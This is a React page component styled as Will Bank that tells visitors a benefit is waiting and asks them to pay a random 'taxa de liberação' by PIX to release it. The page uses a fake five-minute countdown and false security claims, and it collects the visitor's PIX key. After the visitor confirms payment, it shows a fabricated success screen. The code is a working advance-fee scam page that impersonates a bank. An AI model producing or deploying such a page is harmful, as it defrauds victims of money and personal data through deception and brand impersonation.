import { useEffect, useState } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { 
  CheckCircle, 
  Wallet, 
  Copy, 
  ShieldCheck,
  Clock,
  AlertTriangle,
  ChevronRight,
  Shield,
  Loader2,
  QrCode,
  CreditCard,
  BadgeCheck
} from "lucide-react";
import willbankLogo from "@/assets/willbank-logo.png";
import { CPFData } from "@/lib/cpf";
import { toast } from "@/hooks/use-toast";

const Saque = () => {
  const navigate = useNavigate();
  const location = useLocation();
  const [pixKey, setPixKey] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [isCompleted, setIsCompleted] = useState(false);
  const [countdown, setCountdown] = useState(300); // 5 minutes

  const cpfData: CPFData | undefined = location.state?.cpfData;
  const valorBeneficio: number | undefined = location.state?.valorBeneficio;

  // Valor da taxa (aleatório entre R$ 47,90 e R$ 97,90)
  const [valorTaxa] = useState(() => {
    const taxa = Math.floor(Math.random() * (97.90 - 47.90 + 1) + 47.90);
    return taxa;
  });

  useEffect(() => {
    if (!cpfData || !valorBeneficio) {
      navigate("/");
      return;
    }

    // Countdown timer
    const timer = setInterval(() => {
      setCountdown(prev => {
        if (prev <= 0) {
          clearInterval(timer);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);

    return () => clearInterval(timer);
  }, [cpfData, valorBeneficio, navigate]);

  const formatTime = (seconds: number) => {
    const mins = Math.floor(seconds / 60);
    const secs = seconds % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleCopiarPix = () => {
    const pixCode = "00020126580014br.gov.bcb.pix0136example-pix-key-here5204000053039865802BR5925WILL BANK PAGAMENTOS6009SAO PAULO62070503***6304ABCD";
    navigator.clipboard.writeText(pixCode);
    toast({
      title: "Código PIX copiado! ✓",
      description: "Cole o código no seu aplicativo bancário para realizar o pagamento",
    });
  };

  const handleConfirmarPagamento = () => {
    if (!pixKey.trim()) {
      toast({
        variant: "destructive",
        title: "Chave PIX obrigatória",
        description: "Informe sua chave PIX para receber o benefício",
      });
      return;
    }

    setIsProcessing(true);
    
    setTimeout(() => {
      setIsProcessing(false);
      setIsCompleted(true);
      toast({
        title: "Solicitação enviada!",
        description: "Seu saque está sendo processado",
      });
    }, 3000);
  };

  if (!cpfData || !valorBeneficio) return null;

  return (
    <div className="min-h-screen bg-gradient-to-b from-slate-900 via-slate-800 to-slate-900 flex flex-col">
      {/* Header */}
      <header className="px-4 py-4 flex items-center justify-between">
        <img src={willbankLogo} alt="Will Bank" className="h-8 object-contain" />
        <div className="flex items-center gap-2 text-emerald-400 text-xs">
          <Shield className="w-4 h-4" />
          <span>Pagamento seguro</span>
        </div>
      </header>

      {/* Breadcrumb */}
      <div className="px-4 py-2 border-b border-slate-700/50">
        <div className="flex items-center gap-2 text-xs text-slate-400">
          <span>Consulta</span>
          <ChevronRight className="w-3 h-3" />
          <span>Chat</span>
          <ChevronRight className="w-3 h-3" />
          <span className="text-white font-medium">Saque</span>
        </div>
      </div>

      {/* Main Content */}
      <main className="flex-1 flex flex-col items-center px-4 py-6">
        <div className="w-full max-w-md space-y-6">
          
          {!isCompleted ? (
            <>
              {/* Countdown */}
              <div className="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4 flex items-center justify-center gap-3">
                <Clock className="w-5 h-5 text-amber-400" />
                <div className="text-center">
                  <p className="text-amber-400 text-sm font-medium">Oferta expira em</p>
                  <p className="text-2xl font-bold text-amber-400 font-mono">{formatTime(countdown)}</p>
                </div>
              </div>

              {/* Title */}
              <div className="text-center space-y-2">
                <div className="w-16 h-16 mx-auto bg-primary/20 rounded-full flex items-center justify-center">
                  <Wallet className="w-8 h-8 text-primary" />
                </div>
                <h1 className="text-2xl font-bold text-white">
                  Finalize seu saque
                </h1>
                <p className="text-slate-400 text-sm">
                  Pague a taxa de processamento para liberar seu benefício
                </p>
              </div>

              {/* Benefit Value */}
              <div className="bg-gradient-to-r from-emerald-500/20 to-emerald-600/10 rounded-xl p-4 border border-emerald-500/30">
                <div className="flex items-center justify-between">
                  <div>
                    <p className="text-slate-400 text-sm">Valor a receber:</p>
                    <p className="text-3xl font-bold text-emerald-400">
                      R$ {valorBeneficio.toLocaleString('pt-BR')},00
                    </p>
                  </div>
                  <BadgeCheck className="w-12 h-12 text-emerald-400/50" />
                </div>
              </div>

              {/* Fee Info */}
              <div className="bg-slate-800/50 rounded-xl p-4 space-y-4 border border-slate-700/50">
                <div className="flex items-center justify-between">
                  <span className="text-slate-400">Taxa de liberação:</span>
                  <span className="text-xl font-bold text-white">
                    R$ {valorTaxa.toFixed(2).replace('.', ',')}
                  </span>
                </div>
                
                <div className="flex items-start gap-2 bg-amber-500/10 rounded-lg p-3 border border-amber-500/20">
                  <AlertTriangle className="w-4 h-4 text-amber-400 shrink-0 mt-0.5" />
                  <p className="text-xs text-amber-200">
                    Esta taxa cobre os custos de processamento e transferência do seu benefício via PIX.
                  </p>
                </div>
              </div>

              {/* PIX Key Input */}
              <div className="space-y-2">
                <label className="text-sm font-medium text-slate-300 flex items-center gap-2">
                  <CreditCard className="w-4 h-4" />
                  Sua chave PIX para receber
                </label>
                <Input
                  placeholder="CPF, e-mail ou telefone"
                  value={pixKey}
                  onChange={(e) => setPixKey(e.target.value)}
                  className="h-12 bg-slate-800 border-slate-600 text-white placeholder:text-slate-500"
                />
              </div>

              {/* PIX Code */}
              <div className="space-y-3">
                <p className="text-sm text-slate-400 text-center">
                  Pague a taxa via PIX Copia e Cola:
                </p>
                
                <div className="bg-slate-800/50 rounded-xl p-4 border border-slate-700/50 space-y-4">
                  {/* QR Code Placeholder */}
                  <div className="w-32 h-32 mx-auto bg-white rounded-lg flex items-center justify-center">
                    <QrCode className="w-24 h-24 text-slate-900" />
                  </div>

                  <Button
                    variant="outline"
                    onClick={handleCopiarPix}
                    className="w-full h-12 border-primary text-primary hover:bg-primary/10"
                  >
                    <Copy className="w-4 h-4 mr-2" />
                    Copiar código PIX
                  </Button>
                </div>
              </div>

              {/* CTA Button */}
              <Button 
                onClick={handleConfirmarPagamento}
                disabled={isProcessing}
                className="w-full h-14 text-lg font-semibold bg-primary hover:bg-primary/90 text-primary-foreground"
              >
                {isProcessing ? (
                  <>
                    <Loader2 className="w-5 h-5 animate-spin mr-2" />
                    Processando...
                  </>
                ) : (
                  <>
                    Já paguei, confirmar saque
                    <ChevronRight className="w-5 h-5 ml-2" />
                  </>
                )}
              </Button>

              <div className="flex items-center justify-center gap-2 text-slate-500">
                <ShieldCheck className="w-4 h-4" />
                <span className="text-xs">Pagamento 100% seguro e criptografado</span>
              </div>
            </>
          ) : (
            /* Success State */
            <div className="text-center space-y-6 py-8 animate-fade-in">
              <div className="w-24 h-24 mx-auto bg-emerald-500/20 rounded-full flex items-center justify-center">
                <CheckCircle className="w-16 h-16 text-emerald-400" />
              </div>
              
              <div className="space-y-2">
                <h1 className="text-2xl font-bold text-white">
                  Solicitação Enviada!
                </h1>
                <p className="text-slate-400">
                  Seu pedido de saque está sendo processado.
                </p>
              </div>

              <div className="bg-slate-800/50 rounded-xl p-4 border border-slate-700/50 space-y-3 text-left">
                <div className="flex justify-between py-2 border-b border-slate-700">
                  <span className="text-slate-400">Nome:</span>
                  <span className="text-white font-medium">{cpfData.nome}</span>
                </div>
                <div className="flex justify-between py-2 border-b border-slate-700">
                  <span className="text-slate-400">Chave PIX:</span>
                  <span className="text-white font-medium">{pixKey}</span>
                </div>
                <div className="flex justify-between py-2 border-b border-slate-700">
                  <span className="text-slate-400">Valor:</span>
                  <span className="text-emerald-400 font-bold">R$ {valorBeneficio.toLocaleString('pt-BR')},00</span>
                </div>
                <div className="flex justify-between py-2">
                  <span className="text-slate-400">Prazo:</span>
                  <span className="text-white font-medium">Até 24h úteis</span>
                </div>
              </div>

              <div className="bg-emerald-500/10 border border-emerald-500/30 rounded-xl p-4">
                <p className="text-emerald-400 text-sm">
                  ✓ Você receberá uma notificação assim que o valor for depositado na sua conta.
                </p>
              </div>

              <Button 
                onClick={() => navigate("/")}
                variant="outline"
                className="w-full h-12 border-slate-600 text-slate-300 hover:bg-slate-700"
              >
                Voltar ao início
              </Button>
            </div>
          )}

        </div>
      </main>

      {/* Footer */}
      <footer className="px-4 py-4 border-t border-slate-800">
        <div className="text-center space-y-2">
          <img src={willbankLogo} alt="Will Bank" className="h-5 mx-auto object-contain opacity-50" />
          <p className="text-slate-600 text-xs">
            © 2025 Will Bank. Todos os direitos reservados.
          </p>
        </div>
      </footer>
    </div>
  );
};

export default Saque;
